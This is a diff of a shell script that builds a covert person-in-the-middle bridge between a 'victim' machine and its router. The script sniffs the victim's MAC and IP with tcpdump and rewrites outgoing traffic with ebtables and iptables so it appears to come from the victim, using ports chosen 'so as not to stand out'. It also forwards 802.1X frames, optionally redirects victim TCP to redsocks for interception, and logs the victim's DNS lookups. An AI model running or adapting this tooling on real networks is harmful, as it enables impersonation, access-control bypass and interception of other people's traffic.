@@ -1,23 +1,4 @@
-#!/bin/sh
-
-# opkg list-installed | cut -f1 -d' ' | egrep "^(ebtables|ebtables-utils|kmod-ebtables|kmod-ebtables-ipv4)$" | wc -l
-# opkg list-installed | cut -f1 -d' ' | egrep "^(kmod-br-netfilter)$" | wc -l
-# opkg list-installed | cut -f1 -d' ' | egrep "^(kmod-ipt-raw)$" | wc -l
-# opkg list-installed | cut -f1 -d' ' | egrep "^(ip-full)$" | wc -l
-# opkg list-installed | cut -f1 -d' ' | egrep "^(redsocks)$" | wc -l
-
-
-# pass the name of a file containing suitable variables to load
-if [ -n "$1" ] ; then
-    . "$1"
-fi
-
-# Update these to your preferred values or
-# set them in the environment before running the script
-victim_mac=${victim_mac:-02:00:00:00:00:01}
-victim_ip=${victim_ip:-192.168.1.2}
-router_mac=${router_mac:-02:00:00:00:00:02}
-router_ip=${router_ip:-192.168.1.1}
+#!/bin/bash
 
 # Override the various device names if required
 victim_dev=${victim_dev:-lan}
@@ -39,11 +20,17 @@ if [ "`ip netns identify $PID`" != "pitm" ] ; then
 	ip netns list | grep -q pitm || \
 		ip netns add pitm && \
 		ip link set ${victim_dev} netns pitm && \
-		ip link set ${router_dev} netns pitm
+		ip link set ${router_dev} netns pitm && \
+		ip netns exec pitm ip addr add dev lo 127.0.0.1/8 && \
+		ip netns exec pitm ip link set dev lo up
+
+	echo "Spawning a 'screen' instance inside the pitm network namesapce"
+	echo "Access it using:"
+	echo "	screen -R -D -S pitm"
 
 	# Now re-exec the script inside the 'pitm' namespace
-	ip netns exec pitm $0 $*
-	exit
+	ip netns exec pitm screen -d -m -S pitm
+	exec screen -S pitm -X screen -t "slimjim" $0 $8
 fi
 
 # make sure iptables is called at various levels
@@ -80,6 +67,7 @@ if ! brctl show $br_dev > /dev/null 2>&1 ; then
 	brctl addif $br_dev $victim_dev $router_dev
 	# disable IPv6 on the bridge too
 	sysctl -q -w net.ipv6.conf.${br_dev}.disable_ipv6=1
+	echo 65528 > /sys/class/net/${br_dev}/bridge/group_fwd_mask
 fi
 
 # Configure the two interfaces of the bridge
@@ -89,21 +77,40 @@ ip addr flush dev $router_dev
 ip addr flush dev $br_dev
 ip link set dev $victim_dev arp off
 ip link set dev $router_dev arp off
-ip link set dev $br_dev address ${br_dev_mac} arp off
+ip link set dev $br_dev address ${br_dev_mac} arp off multicast off allmulticast off
 ip addr add dev $br_dev ${br_dev_ip}/24
 ip link set dev $br_dev up
 ip link set dev $victim_dev up
 ip link set dev $router_dev up
 
-# Make sure we can reach both our victim and the router
-ip neigh replace $victim_ip lladdr $victim_mac dev $br_dev
-ip neigh replace $router_ip lladdr $router_mac dev $br_dev
-ip route replace $victim_ip dev $br_dev
-ip route replace $router_ip dev $br_dev
+# Any packets seen coming "in" on $victim_dev MUST have the victim's MAC as the source
+echo "Waiting for victim MAC"
+victim_mac=$(tcpdump -c1 -Q in -i ${victim_dev} -nnel 2> /dev/null | awk '{print $2}')
+echo "Got $victim_mac on $victim_dev"
 
-# Optional: Allows routing to the rest of the network
-# It is generally best to be specific about this, to avoid leaking unrelated traffic
-# ip route add 10.0.0.0/24 via $router_ip || ip route change 10.0.0.0/24 via $route_ip
+echo "Now we can identify the victim's IP address"
+while read null MAC1 null MAC2 null null null IP1 null IP2 null ; do
+	MAC2=$(echo "$MAC2" | tr -d ",")
+	IP1=$(echo "$IP1" | sed -nE -e 's/^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/p')
+	IP2=$(echo "$IP2" | sed -nE -e 's/^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/p')
+	if [ -z "${victim_ip}" ] ; then
+		if [ "$MAC1" = "${victim_mac}" ] ; then
+			victim_ip=$IP1
+		elif [ "$MAC2" = "${victim_mac}" ] ; then
+			victim_ip=$IP2
+		fi
+		case "${victim_ip}" in
+			0.0.0.0|239.*.*.*|240.*.*.*|255.*.*.*)
+				victim_ip=''
+				;;
+		esac
+	fi
+	if [ -n "${victim_ip}" ] ; then
+		kill $(cat /tmp/tcpdump.pid) 2> /dev/null
+	fi
+done < <(tcpdump -q -nneli ${br_dev} ip 2> /dev/null & echo $! > /tmp/tcpdump.pid)
+
+echo "Got Victim ${victim_mac} (${victim_ip})"
 
 # Any packets sent to anyone other than the victim appear to come from the victim MAC/IP
 # Any packets sent to the victim appear to come from the router MAC/IP
@@ -111,18 +118,17 @@ ip route replace $router_ip dev $br_dev
 # therefore get pushed down as each new entry is added
 # This is particularly important for ebtables, because we need to be before the "safety" rules
 ebtables -t nat -I POSTROUTING -s ${br_dev_mac} ! -d $victim_mac -j snat --to-source $victim_mac
-ebtables -t nat -I POSTROUTING -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
-
 iptables -t nat -I POSTROUTING -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $victim_ip
-iptables -t nat -I POSTROUTING -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
 
 # We special case TCP and UDP to be able to rewrite the source ports so as not to stand out
 # This range is suitable for a predominantly Windows network
 iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
-iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
-
 iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:27000-32000
-iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
+
+# ebtables -t nat -I POSTROUTING -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
+# iptables -t nat -I POSTROUTING -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
+# iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
+# iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
 
 # optional: Direct any traffic from the victim to hit redsocks, for interception by Mallet, etc
 # create a custom chain
@@ -134,8 +140,15 @@ iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345
 # iptables -t nat -I PREROUTING 1 -p tcp -s $victim_ip -j REDSOCKS
 # iptables -t nat -I PREROUTING 1 -p tcp -d $victim_ip -j REDSOCKS
 
-echo "Spawning a 'screen' instance inside the pitm network namesapce"
-echo "Access it using:"
-echo "\tscreen -R -D -S pitm"
+# IFTOP is possibly useful to see what sort of network traffic the victim is generating
+screen -S pitm -X screen -t "iftop" /usr/sbin/iftop -npNP -i pitm
 
-screen -d -m -S pitm
+# pitm_snoop.py monitors link local addresses, as well as routes to
+# other networks, and also DNS lookups, writing resolved names to
+# hostsdir/hostname, as well as updating /tmp/pitm/resolv.conf with
+# ip addresses of observed name servers
+mkdir -p /tmp/pitm/hostsdir
+screen -S pitm -X screen -t "pitm_snoop" /root/pitm_snoop.py
+
+# dnsmasq can make the observed DNS queries available without any extra network traffic
+screen -S pitm -X screen -t "dnsmasq" /usr/sbin/dnsmasq --no-daemon --no-resolv -z -i lo --hostsdir=/tmp/pitm/hostsdir --bogus-priv
